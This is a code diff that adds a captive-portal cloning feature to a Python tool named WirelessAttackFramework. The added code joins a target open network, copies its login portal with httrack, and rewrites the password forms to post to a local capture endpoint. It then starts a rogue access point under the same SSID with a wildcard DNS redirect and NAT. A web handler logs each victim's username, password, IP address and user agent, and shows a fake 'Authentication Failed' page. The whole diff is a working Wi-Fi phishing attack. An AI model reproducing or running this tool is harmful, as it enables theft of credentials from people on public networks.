@@ -43,6 +43,7 @@ import time
 import glob
 from pathlib import Path
 from datetime import datetime
+from bs4 import BeautifulSoup
 
 class WirelessAttackFramework:
     def __init__(self):
@@ -962,6 +963,481 @@ class WirelessAttackFramework:
         print("="*50)
         print("WPS attacks require additional tools (reaver, bully, etc.)")
         print("Install these tools separately for WPS functionality.")
+        input("\nPress Enter to continue...")
+
+    def captive_portal_attack(self):
+        """Execute captive portal attack with cloning options"""
+        print("\n" + "="*60)
+        print("CAPTIVE PORTAL ATTACK")
+        print("="*60)
+        print("1. Use default captive portal")
+        print("2. Clone target network captive portal")
+        print("3. Back to main menu")
+        print("-"*60)
+
+        choice = input("\nSelect option (1-3): ").strip()
+
+        if choice == '1':
+            self.default_captive_portal()
+        elif choice == '2':
+            self.clone_captive_portal()
+        elif choice == '3':
+            return
+        else:
+            print("Invalid selection.")
+
+    def clone_captive_portal(self):
+        """Clone target network's captive portal"""
+        if not self.target_network:
+            print("No target selected.")
+            return
+
+        # Verify target is open network
+        if self.target_network['privacy'].upper() not in ['OPN', 'OPEN', '']:
+            print(f"\nWarning: Target network appears to be {self.target_network['privacy']}")
+            print("This attack works best on open (OPN) networks with captive portals.")
+            proceed = input("Continue anyway? (y/n): ").strip().lower()
+            if proceed != 'y':
+                return
+
+        target_ssid = self.target_network['essid']
+        portal_dir = Path(f"./captive_portals/{target_ssid.replace(' ', '_')}")
+        portal_dir.mkdir(parents=True, exist_ok=True)
+
+        print(f"\n{'='*60}")
+        print(f"CLONING CAPTIVE PORTAL: {target_ssid}")
+        print(f"{'='*60}")
+
+        # Step 1: Connect to target network
+        print(f"\n[1/6] Connecting to target network...")
+        if not self.connect_to_network(target_ssid):
+            print("Failed to connect to target network.")
+            return
+
+        # Step 2: Detect captive portal URL
+        print(f"\n[2/6] Detecting captive portal URL...")
+        portal_url = self.detect_captive_portal()
+        if not portal_url:
+            print("Could not detect captive portal. Using default URL.")
+            portal_url = "http://192.168.1.1"
+
+        print(f"Portal URL: {portal_url}")
+
+        # Step 3: Clone portal with httrack
+        print(f"\n[3/6] Cloning portal with httrack...")
+        if not self.clone_portal_httrack(portal_url, portal_dir):
+            print("Failed to clone portal.")
+            self.disconnect_from_network()
+            return
+
+        # Step 4: Modify cloned portal forms
+        print(f"\n[4/6] Modifying portal forms to capture credentials...")
+        self.modify_portal_forms(portal_dir)
+
+        # Step 5: Disconnect from target network
+        print(f"\n[5/6] Disconnecting from target network...")
+        self.disconnect_from_network()
+
+        # Step 6: Launch rogue AP with cloned portal
+        print(f"\n[6/6] Launching rogue AP with cloned portal...")
+        print(f"\nPortal files stored in: {portal_dir}")
+        print("\nStarting infrastructure:")
+        print("  - Rogue AP (airbase-ng)")
+        print("  - DHCP server (dnsmasq)")
+        print("  - DNS redirect")
+        print("  - Web server (Python)")
+        print("\nPress Ctrl+C to stop all services\n")
+
+        input("Press Enter to start, or Ctrl+C to cancel...")
+
+        self.launch_rogue_ap_with_portal(portal_dir)
+
+    def connect_to_network(self, ssid):
+        """Connect attacking interface to target network"""
+        try:
+            # Kill any processes using the interface
+            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
+                        capture_output=True, timeout=5)
+
+            # Ensure interface is in managed mode
+            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
+                        capture_output=True)
+
+            # Bring interface up
+            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
+                        check=True, capture_output=True)
+
+            # Connect to network
+            print(f"Connecting to {ssid}...")
+            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'essid', ssid],
+                        check=True, capture_output=True)
+
+            # Request DHCP address
+            print("Requesting IP address...")
+            result = subprocess.run(['sudo', 'dhclient', '-v', self.selected_interface],
+                                capture_output=True, text=True, timeout=15)
+
+            # Verify connection
+            time.sleep(3)
+            check = subprocess.run(['ip', 'addr', 'show', self.selected_interface],
+                                capture_output=True, text=True)
+
+            if 'inet ' in check.stdout:
+                print(f"Connected successfully to {ssid}")
+                return True
+            else:
+                print("Connection failed - no IP address assigned")
+                return False
+
+        except subprocess.TimeoutExpired:
+            print("Connection timeout")
+            return False
+        except subprocess.CalledProcessError as e:
+            print(f"Connection error: {e}")
+            return False
+
+    def disconnect_from_network(self):
+        """Disconnect from current network"""
+        try:
+            subprocess.run(['sudo', 'dhclient', '-r', self.selected_interface],
+                        capture_output=True, timeout=5)
+            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'essid', '""'],
+                        capture_output=True)
+            print("Disconnected from network")
+            return True
+        except:
+            return False
+
+    def detect_captive_portal(self):
+        """Detect captive portal URL by attempting common detection methods"""
+        import socket
+
+        # Common captive portal detection URLs
+        detection_urls = [
+            'http://captive.apple.com',
+            'http://connectivitycheck.gstatic.com/generate_204',
+            'http://www.msftconnecttest.com/connecttest.txt'
+        ]
+
+        try:
+            import urllib.request
+            for url in detection_urls:
+                try:
+                    response = urllib.request.urlopen(url, timeout=5)
+                    # If we get redirected, that's likely the captive portal
+                    if response.geturl() != url:
+                        return response.geturl()
+                except:
+                    continue
+
+            # Fallback: try to get default gateway
+            result = subprocess.run(['ip', 'route', 'show', 'default'],
+                                capture_output=True, text=True)
+            if result.stdout:
+                # Extract gateway IP
+                match = re.search(r'default via ([\d.]+)', result.stdout)
+                if match:
+                    gateway = match.group(1)
+                    return f"http://{gateway}"
+        except:
+            pass
+
+        return None
+
+    def clone_portal_httrack(self, url, output_dir):
+        """Clone captive portal using httrack"""
+        try:
+            # Check if httrack is available
+            httrack_path = self.find_tool('httrack')
+            if not httrack_path:
+                print("httrack not found. Please install it:")
+                print("  sudo apt-get install httrack")
+                return False
+
+            clone_path = output_dir / 'cloned'
+            clone_path.mkdir(exist_ok=True)
+
+            # HTTrack command for deep mirror
+            cmd = [
+                'sudo', httrack_path,
+                url,
+                '-O', str(clone_path),
+                '-r6',  # Depth 6 for comprehensive clone
+                '-%v',  # Verbose
+                '-s0',  # No speed limit
+                '--disable-security-limits',
+                '-c10',  # 10 connections
+                '*.css', '*.js', '*.png', '*.jpg', '*.jpeg', '*.gif', '*.ico', '*.html', '*.htm'
+            ]
+
+            print(f"Running: httrack {url}")
+            print("This may take a minute...")
+
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+
+            # Check if files were created
+            html_files = list(clone_path.glob('**/*.html')) + list(clone_path.glob('**/*.htm'))
+
+            if html_files:
+                print(f"Successfully cloned {len(html_files)} HTML files")
+                return True
+            else:
+                print("No HTML files found in clone")
+                return False
+
+        except subprocess.TimeoutExpired:
+            print("HTTrack timeout - portal may be too large")
+            return False
+        except Exception as e:
+            print(f"Clone error: {e}")
+            return False
+
+    def modify_portal_forms(self, portal_dir):
+        """Modify HTML forms in cloned portal to capture credentials"""
+        import re
+        from bs4 import BeautifulSoup
+
+        clone_path = portal_dir / 'cloned'
+        html_files = list(clone_path.glob('**/*.html')) + list(clone_path.glob('**/*.htm'))
+
+        modified_count = 0
+
+        for html_file in html_files:
+            try:
+                with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    soup = BeautifulSoup(f.read(), 'html.parser')
+
+                # Find all forms
+                forms = soup.find_all('form')
+
+                for form in forms:
+                    # Look for login forms (forms with password fields)
+                    inputs = form.find_all('input')
+                    has_password = any(inp.get('type') == 'password' for inp in inputs)
+                    has_text_or_email = any(inp.get('type') in ['text', 'email', None] for inp in inputs)
+
+                    if has_password and has_text_or_email:
+                        # Modify form to POST to our capture endpoint
+                        form['action'] = '/capture_credentials'
+                        form['method'] = 'post'
+
+                        modified_count += 1
+
+                # Write modified HTML
+                with open(html_file, 'w', encoding='utf-8') as f:
+                    f.write(str(soup))
+
+            except Exception as e:
+                print(f"Error modifying {html_file.name}: {e}")
+                continue
+
+        print(f"Modified {modified_count} forms across {len(html_files)} files")
+
+    def launch_rogue_ap_with_portal(self, portal_dir):
+        """Launch rogue AP with captive portal infrastructure"""
+        import http.server
+        import socketserver
+        from threading import Thread
+
+        if not self.target_network:
+            print("No target network selected")
+            return
+
+        clone_path = portal_dir / 'cloned'
+
+        # Find the main index file
+        index_file = None
+        for name in ['index.html', 'index.htm', 'login.html', 'portal.html']:
+            potential = list(clone_path.glob(f'**/{name}'))
+            if potential:
+                index_file = potential[0]
+                break
+
+        if not index_file:
+            # Just use first HTML file found
+            html_files = list(clone_path.glob('**/*.html'))
+            if html_files:
+                index_file = html_files[0]
+            else:
+                print("No HTML files found in cloned portal")
+                return
+
+        web_root = index_file.parent
+
+        # Create credential log file
+        creds_file = portal_dir / f'captive_portal_creds_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
+
+        # Custom HTTP handler for credential capture
+        class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, directory=str(web_root), **kwargs)
+
+            def do_POST(self):
+                if self.path == '/capture_credentials':
+                    content_length = int(self.headers['Content-Length'])
+                    post_data = self.rfile.read(content_length).decode('utf-8')
+
+                    # Parse credentials
+                    from urllib.parse import parse_qs
+                    params = parse_qs(post_data)
+
+                    # Extract username/password
+                    username = ''
+                    password = ''
+
+                    for key, value in params.items():
+                        key_lower = key.lower()
+                        if any(x in key_lower for x in ['user', 'email', 'login', 'id']):
+                            username = value[0] if value else ''
+                        elif any(x in key_lower for x in ['pass', 'pwd']):
+                            password = value[0] if value else ''
+
+                    # Log credentials
+                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    client_ip = self.client_address[0]
+                    user_agent = self.headers.get('User-Agent', 'Unknown')
+
+                    log_entry = f"""
+    {'='*70}
+    Timestamp: {timestamp}
+    SSID: {self.server.target_ssid}
+    Client IP: {client_ip}
+    User-Agent: {user_agent}
+    Username: {username}
+    Password: {password}
+    {'='*70}
+    """
+
+                    with open(self.server.creds_file, 'a') as f:
+                        f.write(log_entry)
+
+                    print(f"\n[CAPTURED] {username}:{password} from {client_ip}")
+
+                    # Send fake error response
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/html')
+                    self.end_headers()
+                    error_html = '''
+                    <html><body>
+                    <h2>Authentication Failed</h2>
+                    <p>Invalid credentials. Please try again.</p>
+                    <a href="/">Back to login</a>
+                    </body></html>
+                    '''
+                    self.wfile.write(error_html.encode())
+                else:
+                    self.send_error(404)
+
+            def log_message(self, format, *args):
+                # Suppress normal HTTP logs
+                pass
+
+        # Start services
+        processes = []
+
+        try:
+            # 1. Create dnsmasq config
+            dnsmasq_conf = portal_dir / 'dnsmasq.conf'
+            with open(dnsmasq_conf, 'w') as f:
+                f.write(f'''interface=at0
+    dhcp-range=192.168.1.100,192.168.1.200,12h
+    dhcp-option=3,192.168.1.1
+    dhcp-option=6,192.168.1.1
+    address=/#/192.168.1.1
+    ''')
+
+            # 2. Start airbase-ng (rogue AP)
+            print("Starting rogue AP...")
+            airbase_cmd = [
+                'sudo', self.tool_paths['airbase-ng'],
+                '-e', self.target_network['essid'],
+                '-c', self.target_network['channel'],
+                self.selected_interface
+            ]
+
+            airbase_proc = subprocess.Popen(airbase_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            processes.append(('airbase-ng', airbase_proc))
+            time.sleep(3)
+
+            # 3. Configure at0 interface
+            print("Configuring network...")
+            subprocess.run(['sudo', 'ip', 'link', 'set', 'at0', 'up'], check=True)
+            subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.1.1/24', 'dev', 'at0'], check=True)
+
+            # 4. Start dnsmasq
+            print("Starting DHCP/DNS server...")
+            dnsmasq_cmd = [
+                'sudo', self.tool_paths['dnsmasq'],
+                '-C', str(dnsmasq_conf),
+                '--no-daemon'
+            ]
+            dnsmasq_proc = subprocess.Popen(dnsmasq_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            processes.append(('dnsmasq', dnsmasq_proc))
+
+            # 5. Set up iptables for NAT and port forwarding
+            print("Configuring firewall rules...")
+            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'],
+                        capture_output=True)
+
+            # 6. Start web server
+            print("Starting captive portal web server...")
+            PORT = 80
+
+            with socketserver.TCPServer(("192.168.1.1", PORT), CaptivePortalHandler) as httpd:
+                httpd.target_ssid = self.target_network['essid']
+                httpd.creds_file = creds_file
+
+                print(f"\n{'='*70}")
+                print("ROGUE AP ACTIVE")
+                print(f"{'='*70}")
+                print(f"SSID: {self.target_network['essid']}")
+                print(f"Portal: http://192.168.1.1")
+                print(f"Credentials logged to: {creds_file}")
+                print(f"\nWaiting for clients to connect...")
+                print("Press Ctrl+C to stop\n")
+
+                httpd.serve_forever()
+
+        except KeyboardInterrupt:
+            print("\n\nStopping services...")
+        except Exception as e:
+            print(f"\nError: {e}")
+        finally:
+            # Cleanup
+            print("Cleaning up...")
+
+            # Stop processes
+            for name, proc in processes:
+                try:
+                    proc.terminate()
+                    proc.wait(timeout=5)
+                    print(f"Stopped {name}")
+                except:
+                    try:
+                        proc.kill()
+                    except:
+                        pass
+
+            # Clean up iptables
+            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
+            subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)
+
+            # Remove at0
+            subprocess.run(['sudo', 'ip', 'link', 'set', 'at0', 'down'], capture_output=True)
+
+            print("Cleanup complete")
+
+    def default_captive_portal(self):
+        """Use default captive portal (placeholder for future implementation)"""
+        print("\n" + "="*50)
+        print("DEFAULT CAPTIVE PORTAL")
+        print("="*50)
+        print("This will use a pre-built captive portal template.")
+        print("Feature coming soon...")
         input("\nPress Enter to continue...")
 
     def run(self):
